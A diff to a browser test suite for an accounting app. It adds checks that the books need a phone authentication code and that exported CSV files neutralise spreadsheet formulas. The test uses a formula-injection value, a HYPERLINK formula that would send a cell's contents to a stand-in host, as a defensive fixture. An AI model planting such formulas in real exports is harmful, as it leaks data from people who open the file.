@@ -4,7 +4,7 @@ const assert = require('assert');
 const { page, goto, until, sql } = require('../lib');
 
 async function books(browser, who) {
-  const pg = await page(browser, { login: who || 'accountant', aal: who === 'owner' ? 'aal2' : 'aal1', lang: 'en' });
+  const pg = await page(browser, { login: who || 'accountant', aal: 'aal2', lang: 'en' });
   await goto(pg, '/accounting');
   await pg.waitForSelector('#appView:not([hidden])', { timeout: 15000 });
   return pg;
@@ -124,6 +124,28 @@ module.exports.tests = [
       const names = z.toString('latin1');
       ['diario.csv', 'balanza.csv', 'estado-resultados.csv', 'balance-general.csv', 'flujo-efectivo.csv', 'gastos.csv', 'iva-ventas.csv', 'iva-compras.csv', 'inventario-valorado-']
         .forEach((n) => assert.ok(names.includes(n), n + ' in the package'));
+      assert.deepStrictEqual(pg.errors, []);
+    }
+  },
+  {
+    name: 'without the phone code the books stay closed and offer to turn it on; a CSV never starts a spreadsheet formula',
+    run: async ({ browser }) => {
+      const no = await page(browser, { login: 'accountant', aal: 'aal1', lang: 'es' });
+      await goto(no, '/accounting');
+      await no.waitForSelector('#noView:not([hidden])', { timeout: 15000 });
+      await until(async () => /solo se abren con el código de su teléfono/.test(await no.locator('#noWhy').textContent()), 8000, 'why, in Spanish');
+      assert.strictEqual(await no.locator('#enrollStart').isVisible(), true, 'the button to turn the code on');
+      const pg = await books(browser);
+      await pg.click('#tabs [data-view=expenses]');
+      await pg.fill('#xDesc', '=HYPERLINK("https://example.com/?d="&B2,"Ver")');
+      await pg.selectOption('#xAcct', '6299');
+      await pg.fill('#xAmt', '1000');
+      await pg.click('#xGo');
+      await until(() => sql(`select count(*) from expenses`) === '1', 8000, 'saved');
+      const [dl] = await Promise.all([pg.waitForEvent('download'), pg.click('#xCsv')]);
+      const text = require('fs').readFileSync(await dl.path(), 'utf8');
+      assert.match(text, /"'=HYPERLINK\(/, 'the cell is text, not a formula');
+      assert.doesNotMatch(text, /,=HYPERLINK/, 'never a bare formula');
       assert.deepStrictEqual(pg.errors, []);
     }
   }
